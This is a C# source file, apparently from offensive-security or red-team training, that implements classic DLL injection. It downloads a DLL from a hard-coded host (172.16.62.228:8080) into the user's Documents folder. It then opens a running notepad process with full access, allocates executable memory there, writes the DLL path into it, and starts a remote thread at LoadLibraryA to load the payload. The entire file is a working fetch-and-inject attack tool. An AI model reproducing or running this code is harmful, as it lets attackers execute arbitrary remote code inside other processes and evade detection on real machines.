using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace DLLInjector
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true,
        SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            Random rnd = new Random();
            int num = rnd.Next();
            String dllName = dir + "\\"+num+".dll";
            WebClient wc = new WebClient();
            wc.DownloadFile("http://172.16.62.228:8080/calc.dll", dllName);
            
            string ProcessID = "notepad";
            Process[] expProc = Process.GetProcessesByName(ProcessID);
            if (expProc.Length == 0)
            {
                Console.WriteLine($"[X] No PID found for process {ProcessID}.");
                return;
            }
            else
            {
                Console.WriteLine($"[+] PID {expProc[0].Id} found for process {ProcessID}.");
            }
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, expProc[0].Id);
            Console.WriteLine($"[+] Got handler for PID {expProc[0].Id}: 0x{(long)hProcess:X}");

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Console.WriteLine($"[+] Allocated memory in 0x{(long)addr:X}");

            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
            if (res)
            {
                Console.WriteLine($"[+] Shellcode has been copied to allocated memory.");
            }
            else
            {
                Console.WriteLine($"[X] Shellcode could not be copied to allocated memory.");
                return;
            }

            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            Console.WriteLine($"[+] Got address for LoadLibraryA in kernel32.dll: 0x{(long)loadLib:X}");

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
            Console.WriteLine($"[+] Starting new thread for LoadLibraryA in {expProc[0].Id}(0x{(long)hProcess:X}), passing 0x{(long)addr:X} as argument: 0x{(long)hProcess:X}");

        }
    }
}